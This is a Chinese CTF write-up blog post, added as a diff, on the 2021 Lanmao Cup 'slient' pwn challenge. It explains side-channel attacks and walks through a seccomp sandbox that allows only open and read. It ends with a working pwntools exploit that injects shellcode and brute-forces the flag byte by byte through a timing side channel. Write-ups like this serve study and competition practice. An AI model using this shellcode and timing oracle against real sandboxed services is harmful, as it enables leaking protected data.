@@ -1,0 +1,247 @@
+---
+title: "CTF-PWN-沙箱逃逸-[侧信道暴力破解] (2021 蓝帽杯初赛 - slient)"
+date: "2024-02-10 23:54:03 +0800"
+categories:
+  - "CTF 与 Pwn"
+tags:
+  - "沙箱逃逸"
+  - "Pwn"
+  - "CTF"
+series: "CTF Writeup"
+excerpt: "如果比较成功，程序会进入死循环（我们可以用 time 模块获取两个时间戳之间的差值）。例如，如果经过的时间超过 2 秒，就说明我们成功爆破出了 flag 的一个字节。超过两秒的原因是：当没有发生异常时，设置的接收操作会持续 3 秒，所以三秒之后间隔必然大于 2 秒；而当发生异常时——也就是没有进入循环（比较失败）——会抛出异常。侧信道攻击是一种非常规的攻击方式，它利用计算机无意间发出的声音来判断其执行状态，比如通过散热风扇的响声大小来判断计算机正在运行的程序的复杂程度。这是系统的页大小，不一定与硬件的页大小相同。"
+source: "CSDN"
+original_url: "https://blog.csdn.net/llovewuzhengzi/article/details/136073146"
+csdn_article_id: "136073146"
+migrated: true
+---
+
+{% raw %}
+# 侧信道攻击
+侧信道攻击是一类利用物理信息泄露来获取密码系统中秘密信息（例如密钥）的安全攻击方式。侧信道攻击通常涉及以下几个方面：
+
+- 电磁泄露：通过监测设备产生的电磁辐射来获取信息。
+- 时序分析：通过分析密码操作的执行时间来推断密钥。
+- 功耗分析：也叫差分功耗分析（DPA），通过测量设备在处理不同数据时的功耗变化来推断密钥。
+- 声学泄露：通过分析设备发出的声音来获取信息。
+- 故障分析：故意引入错误或故障来扰乱加密过程，从而获取关键信息。
+- 此外，在实际操作中，攻击者可能会逐位猜测密钥，并通过观察侧信道信息的变化来判断每次猜测是否正确。例如，如果攻击者猜测的字符与实际密钥的某一位相匹配，密码设备可能会在某个特定时刻产生特定的电磁信号、声音或功耗变化。这样，攻击者就能逐步推断出完整的密钥。
+> 侧信道攻击是一种非常规的攻击方式，它利用计算机无意间发出的声音来判断其执行状态——例如通过散热风扇的响声大小来判断计算机正在运行的程序的复杂程度；通过窃听按键声音来破译你正在输入的内容；或者通过计算机部件在执行某些程序时消耗的不同功率来监控你的计算机。
+# 侧信道暴力破解
+
+# 2021 蓝帽杯初赛 - slient
+# 先自己准备一个 Flag
+这个已经重复太多次了，就不再说了
+# 检查
+![图片](./assets/csdn-136073146/image-001-8d0289df15.png)
+# 沙箱
+![图片](./assets/csdn-136073146/image-002-a4ca690f5e.png)
+可以看到沙箱只允许 open 和 read
+# IDA 源码
+## main
+
+```c
+__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  unsigned int v3; // eax
+  __int128 v4; // xmm0
+  __int128 v5; // xmm1
+  __int128 v6; // xmm2
+  __int64 v8; // [rsp+48h] [rbp-68h]
+  __int64 v9; // [rsp+50h] [rbp-60h]
+  __int128 buf; // [rsp+60h] [rbp-50h] BYREF
+  __int128 v11; // [rsp+70h] [rbp-40h]
+  __int128 v12; // [rsp+80h] [rbp-30h]
+  __int128 v13; // [rsp+90h] [rbp-20h]
+  unsigned __int64 v14; // [rsp+A0h] [rbp-10h]
+
+  v14 = __readfsqword(0x28u);
+  sub_A60(a1, a2, a3);
+  v13 = 0LL;
+  v12 = 0LL;
+  v11 = 0LL;
+  buf = 0LL;
+  puts("Welcome to silent execution-box.");
+  v3 = getpagesize();
+  v9 = (int)mmap((void *)0x1000, v3, 7, 34, 0, 0LL);
+  read(0, &buf, 0x40uLL);
+  prctl(38, 1LL, 0LL, 0LL, 0LL);
+  prctl(4, 0LL);
+  v8 = seccomp_init(0LL);
+  seccomp_rule_add(v8, 2147418112LL, 2LL, 0LL);
+  seccomp_rule_add(v8, 2147418112LL, 0LL, 0LL);
+  seccomp_load(v8);
+  v4 = buf;
+  v5 = v11;
+  v6 = v12;
+  *(_OWORD *)(v9 + 48) = v13;
+  *(_OWORD *)(v9 + 32) = v6;
+  *(_OWORD *)(v9 + 16) = v5;
+  *(_OWORD *)v9 = v4;
+  ((void (__fastcall *)(__int64, __int64, __int64))v9)(3735928559LL, 3735928559LL, 3735928559LL);
+  return 0LL;
+}
+```
+也就是读取 0x40 字节的输入，然后执行这段内容
+## sub_A60()
+
+```c
+int sub_A60()
+{
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  return setvbuf(stderr, 0LL, 2, 0LL);
+}
+```
+
+# 相关知识
+## size_t getpagesize(void)
+
+函数说明：返回一页的大小，单位为字节。这是系统的页大小，不一定与硬件的页大小相同。
+
+返回值：内存页大小。
+
+补充说明：在 Intel x86 上其返回值应为 4096，即 0x1000
+
+使用 getpagesize 函数来获取一页内存的大小
+## void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
+[深入理解 mmap](https://www.cnblogs.com/binlovetech/p/17712761.html)
+
+> If addr is NULL, then the kernel chooses the (page-aligned)
+       address at which to create the mapping; this is the most portable
+       method of creating a new mapping.  If addr is not NULL, then the
+       kernel takes it as a hint about where to place the mapping; on
+       Linux, the kernel will pick a nearby page boundary (but always
+       above or equal to the value specified by
+       /proc/sys/vm/mmap_min_addr) and attempt to create the mapping
+       there.  If another mapping already exists there, the kernel picks
+       a new address that may or may not depend on the hint.  The
+       address of the new mapping is returned as the result of the call.
+
+
+> Linux 为 mmap 分配虚拟内存时，总是从距 addr 最近的页边界开始，并保证地址不低于 /proc/sys/vm/mmap_min_addr 所指定的值。
+可以看到 mmap_min_addr = 65536 = 0x10000，所以我们就确定了程序使用 mmap 函数在 0x10000 处分配了一页空间。
+
+
+- addr：指定映射的起始地址。通常设为 NULL，让系统自动选择一个合适的地址。如果设置了 MAP_FIXED 标志，则必须提供一个具体地址。
+- length：映射的长度，即要映射的内存大小，单位为字节。
+- prot：映射的访问权限，可以是以下值的组合：
+PROT_READ：可读
+PROT_WRITE：可写
+PROT_EXEC：可执行
+PROT_NONE：不可访问
+- flags：映射的属性，可以是以下值的组合：
+MAP_SHARED：对映射的写入会写回文件
+MAP_PRIVATE：对映射的写入不会写回文件
+MAP_FIXED：使用指定的映射起始地址；如果在指定地址无法成功建立映射，则调用失败
+fd：文件描述符，指定映射的数据来源。如果为 -1，则不关联任何文件。
+- offset：文件映射的偏移量，表示映射从文件的哪个位置开始。通常设为 0。
+- 返回值：
+成功时，返回映射的起始地址；
+失败时，返回 MAP_FAILED（通常是 (void *)-1）。
+
+## range(i,j)
+对应 i 到 j-1
+
+
+## 编写相关 shellcode
+[函数生成器的官方文档](https://docs.pwntools.com/en/stable/shellcraft/amd64.html)
+
+![图片](./assets/csdn-136073146/image-003-5413256134.png)
+![图片](./assets/csdn-136073146/image-004-56a9f2bcde.png)
+![图片](./assets/csdn-136073146/image-005-985715a775.png)
+
+## 发现
+我们发现，当 open 中的参数同样是字符串时，对应生成的 shellcode 也不同
+
+![图片](./assets/csdn-136073146/image-006-63f3575cd1.png)
+参数是字符串和不是字符串时，对应的内容也不同
+![图片](./assets/csdn-136073146/image-007-227559a2e2.png)
+## "' 的用法
+[三引号的用法](https://blog.csdn.net/GreenHandCGL/article/details/79703863)
+
+## 爆破错误时的异常
+![图片](./assets/csdn-136073146/image-008-3f02d5bf80.png)
+## Python 中 ASCII 码与字符的相互转换
+![图片](./assets/csdn-136073146/image-009-bc54c0fef0.png)
+# 思路
+先打开文件，把内容读到可访问的位置，然后逐字节比较字符。由于我们只能 open 和 read 文件，为了区分每个字节的比较是对还是错，可以利用接收时的时间间隔来判断。
+
+> 如果比较成功，程序会进入死循环（我们可以用 time 模块获取两个时间戳之间的差值）。例如，如果经过的时间超过 2 秒，就说明我们成功爆破出了 flag 的一个字节。超过两秒的原因是：当没有发生异常时，设置的接收操作会持续 3 秒，所以三秒之后间隔必然大于 2 秒；而当发生异常时——也就是没有进入循环（比较失败）——会抛出异常。结合 Python 中的 try 和 except 关键字，就可以实现逐字节暴力破解。
+
+## 相关检查
+
+```python
+      try:
+            f.recv(timeout=3)# python代码执行到这里时该语句持续三秒，啥都没有那么接受空,而此时如果比较正确，那么将持续三秒，如果出现异常，那么直接到异常处理，异常处理时间间隔小于2秒
+            f.close()
+        except:
+            pass
+            f.close()
+
+        end=time.time()
+        if end-begin>2:
+            flag=flag+chr(j)
+            print("第",s,"位"+"到第",e-1,"位的内容：",flag)
+            break
+```
+
+# exp
+注意如果打开的文件过多，系统会报错：OSError: [Errno 24] Too many open files。所以我们每次爆破的 flag 字节数是有限的，需要调整下标
+![图片](./assets/csdn-136073146/image-010-f645bf3071.png)
+但我发现我的 exp 并没有这个问题
+![图片](./assets/csdn-136073146/image-011-3d28c9b774.png)
+
+
+
+```python
+import time
+from pwn  import*
+
+context(os="linux",arch="amd64",log_level="debug")
+
+#gdb.attach(f,"b main")
+
+s=0  #0 4 8  12 16 20 
+e=4 #4 8 12 16 20 24 
+flag=""
+for i in range(s,e):
+    for j in range(0x20,0x80):
+        f=process("./chall")
+        f.recvuntil(b"Welcome to silent execution-box.\n")
+        payload=shellcraft.amd64.open("flag")
+        payload=payload+shellcraft.amd64.read("rax",0x10080,30) # mmap分配按照一定规则分配，此时得到地址为0x10000
+        payload=payload+'''
+    loop:
+    cmp byte ptr [0x10080+{0}],{1}
+    je loop
+        '''.format(i,j)
+        f.sendline(asm(payload))
+
+        begin=time.time()
+
+        try:
+            f.recv(timeout=3)# python代码执行到这里时该语句持续三秒，啥都没有那么接受空,而此时如果比较正确，那么将持续三秒，如果出现异常，那么直接到异常处理，异常处理时间间隔小于2秒
+            f.close()
+        except:
+            pass
+            f.close()
+
+        end=time.time()
+        if end-begin>2:
+            flag=flag+chr(j)
+            print("第",s,"位"+"到第",e-1,"位的内容：",flag)
+            break
+        
+
+
+```
+
+# 结果
+
+![图片](./assets/csdn-136073146/image-012-073aeaa8aa.png)
+![图片](./assets/csdn-136073146/image-013-6e197214f3.png)
+![图片](./assets/csdn-136073146/image-014-f523eaa65e.png)
+![图片](./assets/csdn-136073146/image-015-adbb7f9767.png)
+![图片](./assets/csdn-136073146/image-016-7bfce7191d.png)
+![图片](./assets/csdn-136073146/image-017-6d1a3ee1c6.png)
+{% endraw %}
